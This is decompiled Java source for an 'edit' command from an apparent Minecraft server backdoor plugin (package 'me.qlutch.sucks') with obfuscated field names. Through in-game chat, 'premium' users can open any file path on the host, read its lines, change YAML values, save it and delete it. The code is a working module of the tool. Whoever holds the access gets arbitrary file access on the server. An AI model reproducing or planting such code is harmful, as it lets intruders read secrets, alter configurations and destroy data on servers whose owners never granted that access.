/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.InvalidConfigurationException
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.Tips;
import me.qlutch.sucks.utils.PluginUtils;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class EditCommand
extends Command {
    private static HashMap<String, File> xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW = new HashMap();
    private static HashMap<String, YamlConfiguration> £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£ = new HashMap();

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage("§8§m----------------------------------");
                p2.sendMessage("         " + Settings.DARK_RED + Settings.NAME + " by " + Settings.AUTHOR);
                p2.sendMessage("");
                p2.sendMessage("§7edit start <plugin> §8l §fStart editing a plugin config.yml");
                p2.sendMessage("§7edit start <plugin <file> §8l §fStart editing a plugin with given file");
                p2.sendMessage("§7edit start <file> §8l §fStart editing any file");
                p2.sendMessage("§7edit read <start line> <end line> §8l §fRead the file lines");
                p2.sendMessage("§7edit get <section> §8l §fReturns value of the section");
                p2.sendMessage("§7edit set <section> <value> §8l §fSets the section value to something");
                p2.sendMessage("§7edit save §8l §fSave the file you're editing before closing");
                p2.sendMessage("§7edit reload §8l §fReload your changes");
                p2.sendMessage("§7edit delete §8l §fDeletes the file");
                p2.sendMessage("§7edit close §8l §fClose the file");
                p2.sendMessage("");
                p2.sendMessage("§8(" + Settings.DARK_RED + "Tip§8) l §7" + Tips.getTip());
                p2.sendMessage("§8§m----------------------------------");
            } else if (args.length <= 2) {
                File file;
                if (args[1].equalsIgnoreCase("save")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        file = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.get(p2.getName());
                        if (£ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.containsKey(p2.getName())) {
                            try {
                                YamlConfiguration config = £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.get(p2.getName());
                                config.save(file);
                                p2.sendMessage(Settings.PREFIX("File saved!"));
                            }
                            catch (IOException e2) {
                                p2.sendMessage(Settings.PREFIX("Couldn't save file"));
                            }
                        } else {
                            p2.sendMessage(Settings.PREFIX("Non Yaml files don't need to be saved"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (args[1].equalsIgnoreCase("close")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.remove(p2.getName());
                        p2.sendMessage(Settings.PREFIX("Session closed"));
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (args[1].equalsIgnoreCase("reload")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        file = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.get(p2.getName());
                        if (£ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.containsKey(p2.getName())) {
                            try {
                                £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.get(p2.getName()).load(file);
                            }
                            catch (InvalidConfigurationException e3) {
                                p2.sendMessage(Settings.PREFIX("Reload failed"));
                            }
                            catch (IOException e4) {
                                p2.sendMessage(Settings.PREFIX("Reload failed"));
                            }
                            p2.sendMessage(Settings.PREFIX("File reloaded!"));
                        } else {
                            p2.sendMessage(Settings.PREFIX("Non yaml files don't need to be reloaded"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (args[1].equalsIgnoreCase("delete")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        file = xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.get(p2.getName());
                        if (file.delete()) {
                            p2.sendMessage(Settings.PREFIX("File deleted!"));
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.remove(p2.getName());
                        } else {
                            p2.sendMessage(Settings.PREFIX("File failed to deleted!"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
            } else {
                block62: {
                    if (args[1].equalsIgnoreCase("start")) {
                        File config;
                        if (PluginUtils.getPluginByName(args[2]) != null) {
                            config = new File(PluginUtils.getPluginByName(args[2]).getDataFolder() + "/config.yml");
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.put(p2.getName(), config);
                            £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.put(p2.getName(), YamlConfiguration.loadConfiguration((File)config));
                            p2.sendMessage(Settings.PREFIX("Started editing session with the file: " + Settings.RED + "config.yml " + Settings.WHITE + "from the plugin: " + Settings.RED + PluginUtils.getPluginByName(args[2]).getName()));
                        } else if (new File(args[2]).exists()) {
                            config = new File(args[2]);
                            xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.put(p2.getName(), config);
                            p2.sendMessage(Settings.PREFIX("Started editing session with the file: " + Settings.RED + config.getName()));
                        } else {
                            p2.sendMessage(Settings.PREFIX("File does not exist! (Cap Sensitive)"));
                        }
                    }
                    if (args[1].equalsIgnoreCase("read")) {
                        if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                            if (args.length <= 3) {
                                p2.sendMessage(Settings.PREFIX("You need a max line!"));
                            } else {
                                int min = 1;
                                try {
                                    min = Integer.parseInt(args[2]);
                                }
                                catch (NumberFormatException e5) {
                                    p2.sendMessage(Settings.PREFIX("Lines must be an number"));
                                    return;
                                }
                                int max = 1;
                                try {
                                    max = Integer.parseInt(args[3]);
                                }
                                catch (NumberFormatException e6) {
                                    p2.sendMessage(Settings.PREFIX("Lines must be an number"));
                                    return;
                                }
                                try {
                                    List<String> lines = Files.readAllLines(Paths.get(xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.get(p2.getName()).getAbsolutePath(), new String[0]));
                                    if (lines.size() >= max) {
                                        if (min <= lines.size()) {
                                            if (min > 0 && max > 0) {
                                                for (int i2 = min; i2 < max + 1; ++i2) {
                                                    p2.sendMessage(i2 + " " + lines.get(i2 - 1));
                                                }
                                            } else {
                                                p2.sendMessage(Settings.PREFIX("Maximum and Minimum need to be bigger than 0"));
                                            }
                                        } else {
                                            p2.sendMessage(Settings.PREFIX("The file only has " + lines.size() + " lines!"));
                                        }
                                        break block62;
                                    }
                                    p2.sendMessage(Settings.PREFIX("The file only has " + lines.size() + " lines!"));
                                }
                                catch (IOException e7) {
                                    p2.sendMessage(Settings.PREFIX("Error while trying to read file."));
                                }
                            }
                        } else {
                            p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                        }
                    }
                }
                if (args[1].equalsIgnoreCase("get")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        if (£ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.containsKey(p2.getName())) {
                            StringBuilder builder = new StringBuilder();
                            for (int i3 = 2; i3 < args.length; ++i3) {
                                builder.append(" ").append(args[i3]);
                            }
                            p2.sendMessage(Settings.PREFIX("The value of " + builder.substring(1) + " is: " + Settings.RED + "'" + £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.get(p2.getName()).get(builder.substring(1)) + "'"));
                        } else {
                            p2.sendMessage(Settings.PREFIX("You can only use this with Yaml files"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
                if (args[1].equalsIgnoreCase("set")) {
                    if (xZNkDhVRNPA$WyZwvUspYhEYfqDgBwRBeRJwHBs$eJD£jeNdVW.containsKey(p2.getName())) {
                        if (£ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.containsKey(p2.getName())) {
                            String previous = £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.get(p2.getName()).get(args[2]).toString();
                            StringBuilder builder = new StringBuilder();
                            for (int i4 = 3; i4 < args.length; ++i4) {
                                builder.append(" " + args[i4]);
                            }
                            £ZkCPudgvuXNFCpwA£DFjBFJhsfccTXJHRJEnnfdnjq$Bec£U£.get(p2.getName()).set(args[2], (Object)builder.substring(1));
                            p2.sendMessage(Settings.PREFIX("You changed the value of " + Settings.RED + args[2] + Settings.WHITE + " from: " + Settings.RED + "'" + previous + "'" + Settings.WHITE + " to " + Settings.RED + "'" + builder.substring(1) + "'"));
                        }
                    } else {
                        p2.sendMessage(Settings.PREFIX("You don't have any editing session open"));
                    }
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

